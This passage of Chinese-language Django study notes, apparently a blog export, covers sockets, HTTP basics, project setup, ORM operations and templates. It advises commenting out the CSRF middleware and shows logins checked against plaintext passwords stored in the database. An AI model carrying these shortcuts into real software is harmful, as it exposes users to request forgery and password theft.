models.User.objects.filter(username=user, password=pwd):\n  pass\n```\n\n##### 数据库增加\n\n```python\nfrom app1 import models\nmodels.User.objects.create(name=name)\n```\n\n##### 数据库删除\n\n```python\nfrom app1 import models\nmodels.User.objects.get(id=id).delete()\n```\n\n##### 数据库修改\n\n```python\np = models.User.objects.filter(id=request.POST.get('id'))[0]\np.name = 'xxx'\np.save()\n```\n\n\n\n##### 修改数据库为mysql\n\n1.创建mysql数据库\n\n2.修改settings.py\n\n\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.mysql',\n        'NAME': 'login',\n        'HOST': 'localhost',\n        'PORT': 3306,\n        'USER': 'xxx',\n        'PASSWORD': 'xxx',\n    }\n}\nimport pymysql\npymysql.install_as_MySQLdb()\n\n```\n\n3.写model\n\n4.执行数据库迁移\n\n`python3 manage.py makemigrations`\n\n`Python3 manage.py migrate`\n\n##### 模糊语法\n\n```html\n<table border=\"1\">\n        <thead>\n        <tr>\n            <th>序号</th>\n            <th>id</th>\n            <th>name</th>\n        </tr>\n        </thead>\n        <tbody>\n        {% for i in p_list %}\n        <tr>\n            <td>{{ forloop.counter }}</td>\n            <td>{{ i.id }}</td>\n            <td>{{ i.name }}</td>\n        </tr>\n        {% endfor %}\n        </tbody>\n    </table>\n```\n\n\n\n```python\nreturn render(request, 'lists.html', context={'p_list': lists})\n```\n\n\n\n#### Django相关的命令 \n\n##### 1.下载安装\n\n`Pip3 install diango`创建 diango项目\n\n`django-admin startproject`项目名称 启动项目\n\n###### 切换到项目的根目录\n\n`python3 manage. py runserver [127.0.0.1[:8000]]`运行服务\n\n###### 创建app\n\n`python3 manage. py startapp app`    名称 数据库迁移的命令\n\n`python manage. py makemigrations` 检测app下的 model.py的变化记录下变更记录 \n\n`python manage. py migrate` 迁移将变更记录同步到数据库中\n\n##### 2.settings配置\n\n​\tBASE_DIR 项目的根目录\n\n​\tINSTALLED_APPS 注册的app\n\n​\tMIDDLEWARE 中间件\n\n​\t\t注释CSRF保护,可以提交POST请求\n\n​\tTEMPLATES模板\n\n​\t\tDIRS: [os.path.join(BASE_DIR, 'templates')] \n\n​\t静态文件\n\n​\t\tSTATIC_URL = '/static/' 静态文件的别名\n\n​\t\tSTATICFILES_DIRS = [\n\nBASE_DIR, 'static')\t\t\t\t\n\n​\t\t\t\t]\n\n##### \t3.django使用mysql\n\n###### \t\t1.创建mysql数据库\n\n###### \t\t2.配置settings\n\n​\t\t\t\n\n```python\nDATABASES\nENGINE django.db.backends.mysql\nNAME 数据库名\nHOST IP地址\nPORT 3306\nUSER 用户名\nPASSWORD 密码\n```\n\n###### 3.使用pymysql模块连接mysql数据库\n\n建议写在\\_\\_init\\_\\_.py中\n\n```python\nimport pymysql\npymysql.install_as_MySQLdb()\n```\n\n###### 4.在app的models.py写入model(models.model)\n\n```\nfrom django import models\nclass User(models.Model):\n\tusername = models.CharField(max_length=32)\n```\n\n###### 5.迁移至数据库\n\n```\npython3 manage.py makemigrations\npython3 manage.py migrate\n```\n\n##### 4.urls.py 路径与函数对应关系\n\n```python\nfrom app1 import views\nurlpatterns = [\n    path('admin/', admin.site.urls),\n    path('list/', views.p_list),\n    path('create/', views.create),\n    path('delete/', views.delete),\n    path('edit/', views.edit)\n]\n```\n\n##### 5.函数\n\n```python\ndef xxx(request):\n\trequest.method  # 请求方式\n\trequest.POST  # post传输的参数\n  return\n\t# render(request, 'login.html', context={'info': 'Success'})  渲染并返回HTML页面\n  # HttpResponse('字符串')\n  # redirect('/index') \n```\n\n##### 6.ORM\n\n对象关系映射\n\n类 -> 表\n\n对象 -> 数据行\n\n属性 -> 字段\n\n###### 查询\n\n```python\nfrom app1 import models\nmodels.User.objects.all()\nmodels.User.object.get(id=1)\nmodels.User.object.filter(id=1,name='x')\n```\n\n###### 增加\n\n```python\nmodels.User.objects.create(name='123')\n```\n\n###### 删除\n\n```python\nmodels.User.objects.get(id=1).delete()\nmodels.User.objects.filter(id=1).delete()\n```\n\n###### 修改\n\n```python\nobj = models.User.objects.get(id=1)\nobj.name = 'xxx'\nobj.save()\n```\n\n##### 7.模版语法\n\n```\nreturn render(request, 'filename.html', context={'k':'1'})\n返回并渲染一个html页面\n```\n\n```\n{{  k1  }}  # 替换内容\n\n{%  for i in K  %}\n\t{{  forloop.counter. }}\n\t{{ i.name  }}\n{%  endfor  %}\n```\n\n","slug":"django学习笔记","published":1,"updated":"2021-04-04T14:58:56.604Z","_id":"ckn2yk7wl0000nevzb54y1k5q","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"django学习\"><a href=\"#django学习\" class=\"headerlink\" title=\"django学习\"></a>django学习</h1><h4 id=\"Web基本概念——前置\"><a href=\"#Web基本概念——前置\" class=\"headerlink\" title=\"Web基本概念——前置\"></a>Web基本概念——前置</h4><h5 id=\"socket-套接字\"><a href=\"#socket-套接字\" class=\"headerlink\" title=\"socket 套接字\"></a>socket 套接字</h5><p>位于应用层与传输层之间的虚拟层,通过此接口进行数据传输等操作</p>\n<h5 id=\"c-s-架构\"><a href=\"#c-s-架构\" class=\"headerlink\" title=\"c/s 架构\"></a>c/s 架构</h5><p>即client/server架构,通过客户端程序与服务端通信</p>\n<h5 id=\"b-s-架构\"><a href=\"#b-s-架构\" class=\"headerlink\" title=\"b/s 架构\"></a>b/s 架构</h5><p>即browser/server架构,通过浏览器发送http请求,获得服务器的资源</p>\n<p>便捷、通用</p>\n<h5 id=\"请求过程\"><a href=\"#请求过程\" class=\"headerlink\" title=\"请求过程\"></a>请求过程</h5><h6 id=\"0-socket服务端-绑定-监听\"><a href=\"#0-socket服务端-绑定-监听\" class=\"headerlink\" title=\"0.socket服务端 绑定/监听\"></a>0.socket服务端 绑定/监听</h6><p>​    0.0 导入socket库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br></pre></td></tr></table></figure>\n\n<p>​    0.1 创建socket服务端     </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\"><span class=\"comment\"># socket.AF_INET 表示使用ipv4</span></span><br><span class=\"line\"><span class=\"comment\"># socket.SOCK_STREAM 表示使用tcp</span></span><br></pre></td></tr></table></figure>\n\n<p>​    0.2 绑定到本地端口</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socket.bind((<span class=\"string\">&#x27;127.0.0.1&#x27;</span>,<span class=\"number\">8080</span>))</span><br><span class=\"line\"><span class=\"comment\"># target与port要以元组的形势传入</span></span><br></pre></td></tr></table></figure>\n\n<p>​    0.3 开启监听</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socket.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\"># 设置最大连接数</span></span><br></pre></td></tr></table></figure>\n\n<p>​    0.4 等待连接</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tso,addr = socket.accept()</span><br><span class=\"line\">  <span class=\"comment\"># 返回连接socket与客户端地址</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-socket客户端-连接\"><a href=\"#1-socket客户端-连接\" class=\"headerlink\" title=\"1.socket客户端 连接\"></a>1.socket客户端 连接</h6><p>​    0.1 创建socket客户端</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure>\n\n<p>​    0.2 连接服务端</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">client.connect((target,port))</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"2-双方传输数据\"><a href=\"#2-双方传输数据\" class=\"headerlink\" title=\"2.双方传输数据\"></a>2.双方传输数据</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = server.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">client.send(<span class=\"string\">b&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"3-处理请求、发送内容\"><a href=\"#3-处理请求、发送内容\" class=\"headerlink\" title=\"3.处理请求、发送内容\"></a>3.处理请求、发送内容</h6><h6 id=\"4-重复到-2\"><a href=\"#4-重复到-2\" class=\"headerlink\" title=\"4.重复到 2\"></a>4.重复到 2</h6><h6 id=\"5-断开连接\"><a href=\"#5-断开连接\" class=\"headerlink\" title=\"5.断开连接\"></a>5.断开连接</h6><h5 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h5><h6 id=\"Hyper-Text-Transfer-Protocol-超文本传输协议\"><a href=\"#Hyper-Text-Transfer-Protocol-超文本传输协议\" class=\"headerlink\" title=\"Hyper Text Transfer Protocol 超文本传输协议\"></a>Hyper Text Transfer Protocol 超文本传输协议</h6><h6 id=\"推荐书籍-《http权威指南》\"><a href=\"#推荐书籍-《http权威指南》\" class=\"headerlink\" title=\"推荐书籍:《http权威指南》\"></a>推荐书籍:《http权威指南》</h6><h6 id=\"Web中作为请求与响应的标准\"><a href=\"#Web中作为请求与响应的标准\" class=\"headerlink\" title=\"Web中作为请求与响应的标准\"></a>Web中作为请求与响应的标准</h6><p>请求: 请求行 请求头请求数据</p>\n<p><img src=\"https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001733298-201433635.jpg\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>127.0.0.1:8800</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>keep-alive</span><br><span class=\"line\"><span class=\"attribute\">sec-ch-ua</span><span class=\"punctuation\">: </span>&quot;Google Chrome&quot;;v=&quot;89&quot;, &quot;Chromium&quot;;v=&quot;89&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\"><span class=\"attribute\">sec-ch-ua-mobile</span><span class=\"punctuation\">: </span>?0</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span><span class=\"punctuation\">: </span>none</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span><span class=\"punctuation\">: </span>navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-User</span><span class=\"punctuation\">: </span>?1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span><span class=\"punctuation\">: </span>document</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate, br</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span><span class=\"punctuation\">: </span>hblid=LXa5cZvOpVbu5wDe3m39N0HIgrB8BFbo; csrftoken=NQ2jvGjSCUXBQsAU0TgOCoop939FrKCBhyPS7jAgHBlTEtpqgLOvOjZqirQ0gjeQ; security_level=0</span><br><span class=\"line\">\\r\\n</span><br></pre></td></tr></table></figure>\n\n<p>响应: 状态行 响应头部 响应数据</p>\n<p><img src=\"https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001744323-654009411.jpg\"></p>\n<h6 id=\"http默认端口80-https默认端口443\"><a href=\"#http默认端口80-https默认端口443\" class=\"headerlink\" title=\"http默认端口80,https默认端口443\"></a>http默认端口80,https默认端口443</h6><h6 id=\"响应码\"><a href=\"#响应码\" class=\"headerlink\" title=\"响应码\"></a>响应码</h6><p>1xx消息 请求已被服务器接收,继续处理</p>\n<p>2xx成功 请求已成功被服务器接收、理解并接受</p>\n<p>​    200 成功</p>\n<p>3xx重定向 需要后续操作才能完成此请求</p>\n<p>4xx请求错误 客户端请求含有错误或无法执行</p>\n<p>​    403 客户端访问权限不足</p>\n<p>​    404 客户端请求资源不存在</p>\n<p>5xx服务器错误 服务器在处理正确请求时发生错误</p>\n<h6 id=\"请求方法\"><a href=\"#请求方法\" class=\"headerlink\" title=\"请求方法\"></a>请求方法</h6><p>GET、HEAD、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT</p>\n<h6 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h6><p>统一资源定位符,用于从互联网获取信息</p>\n<p><em>Protocol://Domain:Port/Path?Key1=Value1#Part</em></p>\n<h4 id=\"django——正文\"><a href=\"#django——正文\" class=\"headerlink\" title=\"django——正文\"></a>django——正文</h4><h5 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h5><p><code>pip3 install django -i https://pypi.tsinghua.edu.cn/simple</code></p>\n<h5 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h5><p><code>django-admin startproject PROJECT_NAME</code></p>\n<p>或在professional pycharm中创建Django项目</p>\n<p><a href=\"%E9%9C%80%E8%A6%81%E5%9C%A8settings%E4%B8%AD%E6%9B%B4%E6%94%B9DIRS%E8%B7%AF%E5%BE%84(Template)\">^注意</a>: pycharm创建django3项目时,需要在settings.py中加上import os</p>\n<h5 id=\"项目目录\"><a href=\"#项目目录\" class=\"headerlink\" title=\"项目目录\"></a>项目目录</h5><h5 id=\"──-djangoStudy-项目文件夹\"><a href=\"#──-djangoStudy-项目文件夹\" class=\"headerlink\" title=\"|── djangoStudy  项目文件夹\"></a>|── djangoStudy  项目文件夹</h5><h5 id=\"│-──-init-py\"><a href=\"#│-──-init-py\" class=\"headerlink\" title=\"│    |── init.py\"></a>│    |── <strong>init</strong>.py</h5><p>│    |── asgi.py<br>│    |── settings.py 配置<br>│    |── urls.py 路由 -&gt; URL和函数的对应关系<br> |     |── wsgi.py runserver命令使用wsgiref模块当作简单的webserver<br> |── manage.py<br> |── templates</p>\n<h5 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h5><p><code>python3 manage.py runserver [[ip:]port]</code></p>\n<p>Pycharm执行manage.py</p>\n<h5 id=\"编写页面\"><a href=\"#编写页面\" class=\"headerlink\" title=\"编写页面\"></a>编写页面</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> HttpResponse, render</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return HttpResponse(&#x27;index&#x27;) # 返回字符串</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;index.html&#x27;</span>)  <span class=\"comment\"># 返回页面</span></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;index/&#x27;</span>, index),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"逻辑处理\"><a href=\"#逻辑处理\" class=\"headerlink\" title=\"逻辑处理\"></a>逻辑处理</h5><h6 id=\"request类\"><a href=\"#request类\" class=\"headerlink\" title=\"request类\"></a>request类</h6><p><em>METHOD</em> 请求方法</p>\n<p>​    <em>GET&amp;POST</em></p>\n<p><em>GET字典&amp;POST字典</em></p>\n<p>​    <code>POST.get(&#39;Key&#39;) </code>获得提交的参数</p>\n<h6 id=\"redirect类\"><a href=\"#redirect类\" class=\"headerlink\" title=\"redirect类\"></a>redirect类</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> redirect</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect(PATH)</span><br></pre></td></tr></table></figure>\n\n<p>重定向</p>\n<h5 id=\"创建app\"><a href=\"#创建app\" class=\"headerlink\" title=\"创建app\"></a>创建app</h5><h6 id=\"生成app\"><a href=\"#生成app\" class=\"headerlink\" title=\"生成app\"></a>生成app</h6><p><code>django-admin startapp APP_NAME</code></p>\n<p>.<br> |── <strong>init</strong>.py<br> |── admin.py 管理后台<br> |── apps.py app<br> |── migrations<br> |    |── <strong>init</strong>.py<br> |── models.py 数据库<br> |── tests.py<br> |── views.py 函数</p>\n<h6 id=\"安装-注册-app\"><a href=\"#安装-注册-app\" class=\"headerlink\" title=\"安装(注册)app\"></a>安装(注册)app</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class=\"line\">    <span class=\"comment\"># &#x27;app1&#x27;,</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;app1.apps.App1Config&#x27;</span>,  <span class=\"comment\"># 推荐</span></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"app使用\"><a href=\"#app使用\" class=\"headerlink\" title=\"app使用\"></a>app使用</h5><h6 id=\"views-py\"><a href=\"#views-py\" class=\"headerlink\" title=\"views.py\"></a>views.py</h6><p>将函数放在此文件内</p>\n<p>同时更改urls.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> views</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;login/&#x27;</span>, views.login),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;login2/&#x27;</span>, views),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;index/&#x27;</span>, views.index)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"models-py\"><a href=\"#models-py\" class=\"headerlink\" title=\"models.py\"></a>models.py</h5><h6 id=\"Orm\"><a href=\"#Orm\" class=\"headerlink\" title=\"Orm\"></a>Orm</h6><p>对象关系映射</p>\n<p>将对象与一张表一一对应,便捷</p>\n<p>操作有限、牺牲执行效率</p>\n<h6 id=\"models\"><a href=\"#models\" class=\"headerlink\" title=\"models\"></a>models</h6><p>1.在settings.py中设置数据库驱动</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ENGINE&#x27;</span>: <span class=\"string\">&#x27;django.db.backends.sqlite3&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;NAME&#x27;</span>: BASE_DIR / <span class=\"string\">&#x27;db.sqlite3&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2.在models.py中定义orm的关系</p>\n<p>类 -&gt; 表</p>\n<p>对象 -&gt; 数据行(记录)</p>\n<p>属性 -&gt; 字段</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span>(<span class=\"params\">models.Model</span>):</span>  <span class=\"comment\"># 定义一张表，继承Model类</span></span><br><span class=\"line\">    username = models.CharField(max_length=<span class=\"number\">32</span>)  <span class=\"comment\"># varchar(32)</span></span><br><span class=\"line\">    password = models.CharField(max_length=<span class=\"number\">32</span>)</span><br></pre></td></tr></table></figure>\n\n<p>3.<code>python3 manage.py makemigrations</code> 检测所有app有什么变化,制作迁移文件</p>\n<p>4.<code>python3 manage.py migrate  </code> 根据迁移文件,将变更迁移到数据库</p>\n<h5 id=\"数据库查询\"><a href=\"#数据库查询\" class=\"headerlink\" title=\"数据库查询\"></a>数据库查询</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"comment\"># models.User.objects.get(username=user, password=pwd)</span></span><br><span class=\"line\"><span class=\"comment\"># 当get函数查询无结果或有多个结果时会报错</span></span><br><span class=\"line\"><span class=\"comment\"># 建议使用filter</span></span><br><span class=\"line\">models.User.objects.<span class=\"built_in\">all</span>().orderby(<span class=\"string\">&#x27;-id&#x27;</span>)<span class=\"comment\">#按照id字段逆序排列</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> models.User.objects.<span class=\"built_in\">filter</span>(username=user, password=pwd):</span><br><span class=\"line\">  <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"数据库增加\"><a href=\"#数据库增加\" class=\"headerlink\" title=\"数据库增加\"></a>数据库增加</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\">models.User.objects.create(name=name)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"数据库删除\"><a href=\"#数据库删除\" class=\"headerlink\" title=\"数据库删除\"></a>数据库删除</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\">models.User.objects.get(<span class=\"built_in\">id</span>=<span class=\"built_in\">id</span>).delete()</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"数据库修改\"><a href=\"#数据库修改\" class=\"headerlink\" title=\"数据库修改\"></a>数据库修改</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = models.User.objects.<span class=\"built_in\">filter</span>(<span class=\"built_in\">id</span>=request.POST.get(<span class=\"string\">&#x27;id&#x27;</span>))[<span class=\"number\">0</span>]</span><br><span class=\"line\">p.name = <span class=\"string\">&#x27;xxx&#x27;</span></span><br><span class=\"line\">p.save()</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"修改数据库为mysql\"><a href=\"#修改数据库为mysql\" class=\"headerlink\" title=\"修改数据库为mysql\"></a>修改数据库为mysql</h5><p>1.创建mysql数据库</p>\n<p>2.修改settings.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;default&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ENGINE&#x27;</span>: <span class=\"string\">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;NAME&#x27;</span>: <span class=\"string\">&#x27;login&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;HOST&#x27;</span>: <span class=\"string\">&#x27;localhost&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PORT&#x27;</span>: <span class=\"number\">3306</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;USER&#x27;</span>: <span class=\"string\">&#x27;xxx&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PASSWORD&#x27;</span>: <span class=\"string\">&#x27;xxx&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\">pymysql.install_as_MySQLdb()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>3.写model</p>\n<p>4.执行数据库迁移</p>\n<p><code>python3 manage.py makemigrations</code></p>\n<p><code>Python3 manage.py migrate</code></p>\n<h5 id=\"模糊语法\"><a href=\"#模糊语法\" class=\"headerlink\" title=\"模糊语法\"></a>模糊语法</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span 